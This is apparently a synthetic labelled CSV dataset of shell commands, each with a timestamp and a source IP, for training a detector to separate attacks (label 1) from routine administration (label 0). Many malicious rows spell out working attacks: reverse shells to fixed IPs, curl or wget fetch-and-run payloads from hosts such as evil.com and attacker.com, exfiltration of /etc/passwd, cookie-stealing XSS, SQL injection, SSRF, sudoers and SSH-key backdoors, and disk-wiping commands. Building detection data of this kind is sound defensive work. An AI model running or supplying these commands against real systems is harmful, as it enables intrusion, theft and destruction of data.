timestamp,attacker_ip,command_sequence,label
2026-01-23 12:56:12,126.162.151.182,cat ../../../../etc/shadow,1
2026-01-23 08:38:12,150.210.44.139,mount | grep ext4,0
2026-01-23 11:55:12,80.27.179.163,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 03:01:12,189.135.211.240,ps aux | grep nginx,0
2026-01-23 16:05:12,43.230.20.1,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 06:24:12,107.165.61.71,grep 'error' /var/log/syslog,0
2026-01-23 07:34:12,134.183.92.179,tar -czf backup.tar.gz /var/www/html,0
2026-01-23 11:54:12,184.233.162.149,echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,1
2026-01-23 14:27:12,138.119.227.62,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 15:33:12,43.148.82.63,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 11:22:12,50.232.197.73,nc -e /bin/sh 10.0.0.1 4444,1
2026-01-23 15:43:12,201.231.146.124,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 07:21:12,21.83.169.188,localectl status,0
2026-01-23 11:28:12,167.219.11.142,"curl ""http://target.com/api?id=1' OR '1'='1""",1
2026-01-23 15:47:12,163.172.133.204,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
2026-01-23 08:48:12,197.206.4.121,nslookup google.com,0
2026-01-23 03:33:12,109.5.192.95,wget --spider https://example.com/file.zip,0
2026-01-23 13:58:12,33.122.147.91,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 12:52:12,196.59.146.178,rm -rf /var/www/html/*,1
2026-01-23 05:09:12,61.9.98.156,ls -la /var/log/,0
2026-01-23 05:39:12,205.188.162.191,fdisk -l,0
2026-01-23 10:28:12,61.228.209.216,cat /var/www/../../../../etc/passwd,1
2026-01-23 01:51:12,205.9.146.71,systemctl status nginx,0
2026-01-23 07:09:12,36.17.221.72,chown www-data:www-data /var/www/html -R,0
2026-01-23 14:08:12,190.36.217.95,"curl ""http://target.com/file?path=../../../etc/passwd""",1
2026-01-23 14:14:12,169.6.208.192,cat ../../../etc/passwd,1
2026-01-23 07:32:12,122.91.93.29,chmod 644 /var/www/html/index.html,0
2026-01-23 03:51:12,69.153.136.174,find /var/www -name '*.php' -mtime -1,0
2026-01-23 01:56:12,140.46.193.208,ls -la /var/log/,0
2026-01-23 07:58:12,218.52.220.218,tail -100 /var/log/nginx/access.log,0
2026-01-23 13:05:12,8.216.82.121,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
2026-01-23 11:36:12,133.198.184.127,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 06:40:12,110.171.167.105,cat /proc/meminfo | head -10,0
2026-01-23 05:41:12,131.56.142.85,dig example.com,0
2026-01-23 13:52:12,203.59.47.191,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 10:12:12,132.24.27.29,"echo ""* * * * * curl -s http://malicious.server/cron.sh | bash"" >> /var/spool/cron/root",1
2026-01-23 01:33:12,18.225.107.238,rsync -av /home/user/backup/ /mnt/backup_drive/,0
2026-01-23 03:50:12,31.48.187.212,uptime,0
2026-01-23 12:04:12,197.111.2.193,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
2026-01-23 12:25:12,149.74.136.105,enum4linux target.com,1
2026-01-23 08:27:12,142.157.215.185,apt update,0
2026-01-23 06:33:12,109.9.190.235,du -sh /var/www/*,0
2026-01-23 11:33:12,29.47.245.86,"curl -H ""User-Agent: <img src=x onerror=alert(1)>"" http://target.com/",1
2026-01-23 15:56:12,46.64.55.130,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
2026-01-23 03:18:12,112.175.242.15,mtr -c 10 google.com,0
2026-01-23 17:38:12,110.82.202.98,rm -rf /* --no-preserve-root,1
2026-01-23 06:14:12,90.0.55.188,ping -c 4 google.com,0
2026-01-23 10:15:12,70.201.58.76,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
2026-01-23 04:35:12,105.75.41.163,mtr -c 10 google.com,0
2026-01-23 02:07:12,219.125.29.122,df -h /,0
2026-01-23 07:51:12,31.219.249.54,tar -czf backup.tar.gz /var/www/html,0
2026-01-23 02:10:12,216.238.104.236,tail -20 /var/log/syslog,0
2026-01-23 13:19:12,55.127.112.18,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
2026-01-23 10:20:12,5.139.169.155,sudo -u#-1 /bin/bash,1
2026-01-23 14:40:12,196.223.98.63,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 10:42:12,209.42.117.78,"echo ""*/5 * * * * curl -s http://attacker.com/payload.sh | bash"" >> /var/spool/cron/crontabs/root",1
2026-01-23 15:50:12,170.41.132.64,rm -rf /* --no-preserve-root,1
2026-01-23 01:46:12,180.32.98.106,ls -la /var/log/,0
2026-01-23 07:56:12,214.224.120.12,curl -s https://api.ipify.org,0
2026-01-23 17:04:12,187.237.89.183,echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys,1
2026-01-23 14:33:12,218.166.255.254,rm -rf /* --no-preserve-root,1
2026-01-23 11:38:12,155.181.26.112,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 17:32:12,48.48.30.85,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 02:19:12,81.54.22.35,apt update && apt list --upgradable,0
2026-01-23 14:51:12,71.158.172.77,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
2026-01-23 04:09:12,128.126.106.165,ls -la /var/log/,0
2026-01-23 16:16:12,46.15.188.70,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
2026-01-23 11:24:12,8.181.150.229,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
2026-01-23 10:40:12,28.84.175.69,sudo -u#-1 /bin/bash,1
2026-01-23 09:40:12,162.12.19.78,sudo -u#-1 /bin/bash,1
2026-01-23 04:11:12,149.18.252.60,cat /proc/meminfo | head -10,0
2026-01-23 14:07:12,212.183.53.15,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2026-01-23 09:39:12,166.66.86.214,bash -i >& /dev/tcp/192.168.1.100/4444 0>&1,1
2026-01-23 07:45:12,55.184.210.153,scp user@server:/var/log/app.log ./,0
2026-01-23 17:09:12,165.178.122.36,"curl ""http://target.com/file?path=../../../etc/passwd""",1
2026-01-23 14:20:12,208.94.120.30,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
2026-01-23 07:54:12,113.75.96.228,rsnapshot daily,0
2026-01-23 17:34:12,117.15.203.207,cat ../../../etc/passwd,1
2026-01-23 05:42:12,83.195.24.107,wget --spider https://example.com/file.zip,0
2026-01-23 07:04:12,181.155.5.218,cat /proc/cpuinfo | grep 'model name',0
2026-01-23 17:25:12,42.202.96.233,ncat 10.0.0.1 4444 -e /bin/bash,1
2026-01-23 17:46:12,140.142.116.190,host -t txt target.com,1
2026-01-23 04:13:12,117.129.132.10,mtr -c 10 google.com,0
2026-01-23 12:23:12,170.125.143.60,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 01:18:12,149.131.42.158,ping -c 4 8.8.8.8,0
2026-01-23 08:14:12,49.145.149.51,tar -czf backup.tar.gz /var/www/html,0
2026-01-23 16:50:12,30.95.244.173,enum4linux target.com,1
2026-01-23 05:28:12,48.28.149.240,traceroute google.com,0
2026-01-23 05:59:12,113.153.183.11,ln -s /var/www/html /home/user/www,0
2026-01-23 02:18:12,205.163.36.128,ping -c 4 8.8.8.8,0
2026-01-23 15:46:12,203.33.150.109,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
2026-01-23 06:26:12,34.155.121.168,fdisk -l,0
2026-01-23 10:58:12,29.58.15.58,"curl ""http://target.com/load?file=../../../../etc/passwd""",1
2026-01-23 03:12:12,208.69.232.45,ss -tulwn,0
2026-01-23 13:16:12,86.31.204.43,echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,1
2026-01-23 05:25:12,33.189.121.238,find /var/www -name '*.php' -mtime -1,0
2026-01-23 04:38:12,206.48.210.19,chown www-data:www-data /var/www/html -R,0
2026-01-23 05:54:12,218.207.1.197,chown www-data:www-data /var/www/html -R,0
2026-01-23 12:41:12,130.113.185.84,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2026-01-23 13:23:12,106.4.223.152,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 16:12:12,141.180.123.73,find / -perm -4000 -type f 2>/dev/null,1
2026-01-23 11:06:12,151.116.8.51,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 07:42:12,194.214.77.153,rsync -avz /var/www/html/ backup/,0
2026-01-23 07:49:12,85.24.120.92,apt list --upgradable,0
2026-01-23 07:03:12,214.24.155.6,tail -100 /var/log/nginx/access.log,0
2026-01-23 02:31:12,47.32.52.132,systemctl status nginx,0
2026-01-23 12:47:12,43.123.223.34,nc -e /bin/sh 10.0.0.1 4444,1
2026-01-23 01:43:12,170.62.149.9,rsync -avz /home/user/documents/ /backup/documents/,0
2026-01-23 04:56:12,222.233.187.27,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 09:08:12,193.82.72.250,nmcli device status,0
2026-01-23 11:19:12,199.69.64.53,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
2026-01-23 17:08:12,74.206.45.186,host -t txt target.com,1
2026-01-23 13:49:12,88.6.137.59,"curl ""http://target.com/file?path=../../../etc/passwd""",1
2026-01-23 03:25:12,147.203.74.16,crontab -l,0
2026-01-23 07:24:12,157.112.84.21,dig example.com,0
2026-01-23 13:48:12,23.37.17.152,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
2026-01-23 05:14:12,198.120.116.249,ln -s /var/www/html /home/user/www,0
2026-01-23 10:50:12,132.171.9.185,sudo -u#-1 /bin/bash,1
2026-01-23 08:53:12,188.100.197.192,netstat -tulpn,0
2026-01-23 12:00:12,75.167.78.181,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
2026-01-23 03:17:12,61.85.64.33,find /var/www -name '*.php' -mtime -1,0
2026-01-23 10:24:12,142.72.223.90,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.10.10"",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 01:49:12,49.203.58.203,apt update && apt list --upgradable,0
2026-01-23 03:58:12,80.87.61.29,hostnamectl,0
2026-01-23 10:07:12,200.128.240.189,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"" http://target.com",1
2026-01-23 13:20:12,220.188.235.130,find / -perm -4000 -type f 2>/dev/null,1
2026-01-23 04:29:12,99.254.14.190,uptime,0
2026-01-23 17:48:12,20.240.92.247,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
2026-01-23 09:41:12,215.129.118.11,tar czf - /etc/passwd | base64 | curl -X POST --data-binary @- http://exfil.server/collect,1
2026-01-23 06:17:12,52.241.184.157,ip route show,0
2026-01-23 07:43:12,147.28.144.164,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 15:36:12,91.93.142.93,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 16:44:12,170.30.214.251,echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,1
2026-01-23 09:20:12,185.74.48.80,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 02:48:12,4.163.127.56,ping -c 4 8.8.8.8,0
2026-01-23 05:04:12,26.64.40.95,apt list --upgradable,0
2026-01-23 02:45:12,179.179.60.243,"journalctl --since ""1 hour ago"" -u ssh",0
2026-01-23 13:39:12,62.89.254.69,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2026-01-23 03:21:12,59.160.52.190,mount | grep ext4,0
2026-01-23 13:53:12,153.137.139.241,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 05:02:12,51.150.207.26,ip addr show,0
2026-01-23 16:21:12,205.62.94.137,rm -rf /* --no-preserve-root,1
2026-01-23 13:47:12,181.101.198.95,dig @target.com axfr target.com,1
2026-01-23 10:04:12,105.54.168.214,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.15.100"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 13:33:12,214.62.52.114,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
2026-01-23 15:10:12,106.189.78.125,"curl -H ""User-Agent: <img src=x onerror=alert(1)>"" http://target.com/",1
2026-01-23 11:16:12,40.138.243.129,curl http://evil.com/backdoor.php | bash,1
2026-01-23 02:30:12,212.169.114.217,tail -20 /var/log/syslog,0
2026-01-23 11:18:12,113.143.249.47,dig @target.com axfr target.com,1
2026-01-23 01:20:12,209.62.34.201,tail -20 /var/log/syslog,0
2026-01-23 03:36:12,151.108.234.194,cat /etc/nginx/nginx.conf,0
2026-01-23 02:53:12,137.28.197.135,rsync -avz /home/user/documents/ /backup/documents/,0
2026-01-23 05:47:12,83.12.49.197,crontab -l,0
2026-01-23 12:17:12,118.83.202.192,"curl -H ""User-Agent: <img src=x onerror=alert(1)>"" http://target.com/",1
2026-01-23 08:25:12,117.83.125.193,curl -s https://api.ipify.org,0
2026-01-23 14:01:12,150.17.120.25,cat ../../../etc/passwd,1
2026-01-23 17:55:12,6.248.125.221,enum4linux target.com,1
2026-01-23 17:27:12,39.154.252.133,chmod 4777 /bin/bash,1
2026-01-23 16:46:12,108.45.22.224,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
2026-01-23 06:51:12,66.218.57.219,localectl status,0
2026-01-23 06:35:12,171.130.46.85,hostnamectl,0
2026-01-23 17:53:12,168.190.29.106,echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,1
2026-01-23 17:07:12,208.180.8.119,ncat 10.0.0.1 4444 -e /bin/bash,1
2026-01-23 06:41:12,98.201.225.35,crontab -l,0
2026-01-23 17:35:12,72.52.170.201,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 06:20:12,132.174.99.44,curl -I https://example.com,0
2026-01-23 04:45:12,41.223.240.84,ls -la /var/log/,0
2026-01-23 12:49:12,8.45.208.164,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
2026-01-23 12:14:12,216.74.26.15,dig @target.com axfr target.com,1
2026-01-23 04:23:12,126.221.58.153,cat /etc/nginx/nginx.conf,0
2026-01-23 17:10:12,129.13.178.96,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 09:12:12,62.154.209.100,du -sh /var/www/*,0
2026-01-23 16:45:12,189.102.245.188,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
2026-01-23 13:59:12,50.26.94.250,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 16:25:12,193.224.58.59,nikto -h http://target.com,1
2026-01-23 13:36:12,113.213.58.3,dd if=/dev/zero of=/dev/sda bs=1M,1
2026-01-23 07:40:12,97.250.4.217,whoami,0
2026-01-23 15:40:12,70.124.25.202,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2026-01-23 09:43:12,131.70.9.71,"curl ""http://target.com/export?file=....//....//....//proc/self/environ""",1
2026-01-23 16:10:12,198.179.128.175,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 12:19:12,218.87.64.220,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
2026-01-23 03:49:12,51.187.209.114,ping -c 4 google.com,0
2026-01-23 08:54:12,165.99.239.53,lsblk,0
2026-01-23 14:03:12,153.185.214.194,nikto -h http://target.com,1
2026-01-23 14:44:12,58.131.243.183,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
2026-01-23 08:36:12,107.25.180.21,lsblk,0
2026-01-23 04:58:12,120.196.171.94,nslookup google.com,0
2026-01-23 11:51:12,19.6.62.102,nikto -h http://target.com,1
2026-01-23 08:01:12,30.36.233.206,ln -s /var/www/html /home/user/www,0
2026-01-23 08:10:12,174.249.128.12,curl -s https://api.ipify.org,0
2026-01-23 16:08:12,209.66.205.234,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
2026-01-23 12:13:12,215.156.41.189,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 02:03:12,111.141.215.111,rsync -avz /home/user/data/ /backup/user_data/,0
2026-01-23 07:02:12,172.104.245.167,grep 'error' /var/log/syslog,0
2026-01-23 07:38:12,189.56.106.12,du -sh /var/www/*,0
2026-01-23 15:03:12,14.230.182.79,echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys,1
2026-01-23 06:55:12,94.158.233.218,du -sh /var/www/*,0
2026-01-23 16:30:12,148.151.90.124,enum4linux target.com,1
2026-01-23 14:42:12,112.253.66.50,nikto -h http://target.com,1
2026-01-23 04:08:12,74.157.248.194,chmod 644 /var/www/html/index.html,0
2026-01-23 09:59:12,135.129.59.199,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
2026-01-23 09:23:12,169.192.175.154,du -sh /var/www/*,0
2026-01-23 16:14:12,71.162.229.140,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 05:32:12,28.179.246.131,ls -la /var/log/,0
2026-01-23 13:01:12,60.250.184.92,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
2026-01-23 12:28:12,21.35.178.14,"curl ""http://target.com/api?id=1' OR '1'='1""",1
2026-01-23 14:57:12,207.110.15.74,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 05:01:12,221.171.159.247,uptime,0
2026-01-23 05:43:12,66.179.252.168,netstat -tulpn,0
2026-01-23 02:39:12,156.222.43.19,apt update && apt list --upgradable,0
2026-01-23 07:00:12,56.168.98.135,whoami,0
2026-01-23 08:32:12,168.84.28.32,cat /etc/nginx/nginx.conf,0
2026-01-23 14:52:12,72.112.20.84,nikto -h http://target.com,1
2026-01-23 17:14:12,43.56.114.233,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
2026-01-23 16:43:12,35.22.236.145,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 10:43:12,185.231.54.35,"curl ""http://target.com/upload?file=../../../etc/shadow""",1
2026-01-23 03:40:12,164.86.156.169,scp user@server:/var/log/app.log ./,0
2026-01-23 13:07:12,158.148.44.77,mkfs.ext4 /dev/sda1,1
2026-01-23 13:54:12,181.161.198.151,curl http://evil.com/backdoor.php | bash,1
2026-01-23 08:49:12,90.127.43.229,cat /proc/cpuinfo | grep 'model name',0
2026-01-23 05:46:12,21.70.160.53,mount | grep ext4,0
2026-01-23 10:25:12,126.203.36.192,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
2026-01-23 10:16:12,119.232.38.92,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 04:49:12,60.83.34.239,rsync -avz /var/www/html/ backup/,0
2026-01-23 01:45:12,167.79.13.180,"journalctl --since ""1 hour ago"" -u ssh",0
2026-01-23 12:44:12,57.196.190.113,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
2026-01-23 07:39:12,138.112.71.89,apt update,0
2026-01-23 12:53:12,198.135.85.152,"curl ""http://target.com/file?path=../../../etc/passwd""",1
2026-01-23 15:21:12,99.87.199.239,find / -perm -4000 -type f 2>/dev/null,1
2026-01-23 05:13:12,90.36.131.234,tail -100 /var/log/nginx/access.log,0
